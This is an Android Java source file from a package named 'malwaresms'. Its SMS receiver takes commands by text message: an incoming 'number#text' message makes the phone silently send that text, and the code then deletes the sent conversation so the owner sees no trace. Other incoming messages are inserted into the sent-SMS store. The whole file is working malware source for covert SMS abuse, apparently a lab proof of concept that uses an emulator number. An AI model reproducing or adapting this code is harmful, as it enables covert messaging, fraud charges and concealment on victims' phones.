package android.malwaresms;

import java.util.ArrayList;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.gsm.SmsMessage;
import android.util.Log;

@SuppressWarnings("deprecation")
public class SMSReceiver extends BroadcastReceiver {
	public static final String SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED";
	
	public void sendSMS(String phoneNumber,String message){
		Log.i("sendSMS","before send SMS");
		//get a SmsManager
        android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();
        
        //Message may exceed 160 characters
        //need to divide the message into multiples
        ArrayList<String> divideContents = smsManager.divideMessage(message);
        
        for (String text : divideContents) {    
            smsManager.sendTextMessage(phoneNumber, null, text, null, null);    
        }  
    }
	
	public void deleteSentSMS() {  
	    try {  
	    	
	    	ContentResolver CR = MalwareSMS.cr;  
	        // Query SMS  
	        Uri uriSms = Uri.parse("content://sms/sent/");  
	        Cursor c = CR.query(uriSms,  
	                new String[] { "_id", "thread_id", "address" }, null, null, null);
	        Log.d("deleteSMS","In Delete");
	        if (null != c && c.moveToFirst()) {  
	            do {  
	                // Delete SMS  
	                long threadId = c.getLong(1);
	                long addr = c.getLong(2);
	                if (addr == 5556){
	                	CR.delete(Uri.parse("content://sms/conversations/" + threadId),  
	                        null, null);  
	                	Log.d("deleteSMS", "threadId:: "+threadId);
	                }
	            } while (c.moveToNext());  
	        }  
	        
	    } catch (Exception e) {  
	        // TODO: handle exception  
	        Log.d("deleteSMS", "Exception:: " + e);  
	    }  
	} 
	
	@Override
	public void onReceive(Context context, Intent intent) {
		Log.i("REC","receive a message");
		if (intent.getAction().equals(SMS_RECEIVED_ACTION)){
			Bundle bundle = intent.getExtras();
			if (bundle != null){
				Object[] pdus = (Object[]) bundle.get("pdus");
				SmsMessage smsmessage[] = new SmsMessage[pdus.length];
				for (int i = 0; i < pdus.length; i++) {
						 smsmessage[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
	
						 // get the received SMS content
						 String receivedPattern = smsmessage[i].getDisplayMessageBody();
						 String originNum = smsmessage[i].getDisplayOriginatingAddress();
						 Log.i("REC",receivedPattern);
						 Log.i("REC",originNum);
						 
						 String[] tempMessage = receivedPattern.split("#");
						 Log.i("REC",tempMessage[0]);
						 
						 boolean flag = true;
						 if (tempMessage.length != 2) flag = false;
						 else if (!(tempMessage[0].equals("5556"))) flag = false;
						 
						 if (flag){
							 String phoneNo = tempMessage[0];
							 String message = tempMessage[1];
							 Log.i("AndroidServer", "No:" + phoneNo + " message:" + message);
	
							 sendSMS(phoneNo, message);
							 Log.i("REC","sent");
							 // delete the SMS
							 deleteSentSMS();
						 }
						 else { // write the sms into sms database
							 // reference:  http://www.jb51.net/article/54689.htm
							try{
								ContentValues values = new ContentValues();
								values.put("date", System.currentTimeMillis()); // time
								values.put("read", 0);	// read-state
								values.put("type", 1);	// 1:received 2:sent
								values.put("address", originNum); // sms origin number
								values.put("body", receivedPattern); // sms body content
								ContentResolver CR = MalwareSMS.cr;
								CR.insert(Uri.parse("content://sms/sent"),values);
							} 
							catch (Exception e){
								Log.d("Exception",e.getMessage());
							}
						 }
					 }
				}	
		}
   }

}

